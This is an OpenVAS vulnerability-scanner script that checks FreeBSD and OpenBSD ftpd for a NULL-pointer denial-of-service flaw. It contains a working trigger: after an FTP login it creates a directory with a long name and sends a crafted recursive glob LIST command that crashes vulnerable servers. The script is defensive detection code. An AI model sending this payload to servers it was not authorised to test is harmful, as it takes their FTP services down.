###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bsd_ftpd_38559.nasl 8440 2018-01-17 07:58:46Z teissa $
#
# FreeBSD and OpenBSD 'ftpd' NULL Pointer Dereference Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The FreeBSD and OpenBSD 'ftpd' service is prone to a denial-of-service
vulnerability because of a NULL-pointer dereference.

Successful exploits may allow remote attackers to cause denial-of-
service conditions. Given the nature of this issue, attackers may also
be able to run arbitrary code, but this has not been confirmed.

This issue affects the following releases:

FreeBSD 8.0, 6.3, 4.9 OpenBSD 4.5 and 4.6";

tag_solution = "Updates are available; please see the references for more information.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100532");
 script_version("$Revision: 8440 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-17 08:58:46 +0100 (Wed, 17 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-03-15 19:33:39 +0100 (Mon, 15 Mar 2010)");
 script_bugtraq_id(38559);
 script_tag(name:"cvss_base", value:"7.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
 script_name("FreeBSD and OpenBSD 'ftpd' NULL Pointer Dereference Denial Of Service Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38559");
 script_xref(name : "URL" , value : "http://www.freebsd.org/");
 script_xref(name : "URL" , value : "http://www.openbsd.org/errata45.html");
 script_xref(name : "URL" , value : "http://www.openbsd.org/errata46.html");
 script_xref(name : "URL" , value : "http://www.openbsd.org");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

if(safe_checks())exit(0);

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}    

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "anonymous";
if(!pass)pass = string("openvas@", domain);;

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
  
  result = ftp_send_cmd(socket:soc1, cmd: string("syst"));
  if("BSD" >!< result)exit(0);
  
  crap = crap(length: 193, data: "W");
  result = ftp_send_cmd(socket:soc1, cmd: string("MKD ", crap));

  if("257" >!< result) {
    if(result !~ "550 W{193}: File exists") { 
      exit(0); 
    }  
  }  

  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(!ftpPort2)exit(0);

  soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
  if(!soc2)exit(0);

  send(socket:soc1, data: string("list {W*/../W*/../W*/../W*/../W*/../W*/../W*/}\r\n"));
  result1 = ftp_recv_line(socket:soc1);
  result2 = ftp_recv_data(socket:soc2);

  if(!result1 && !result2) {
    security_message(port: ftpPort);
    exit(0);
  }  
 
  close(soc1);
  close(soc2);
}

close(soc1);

exit(0); 

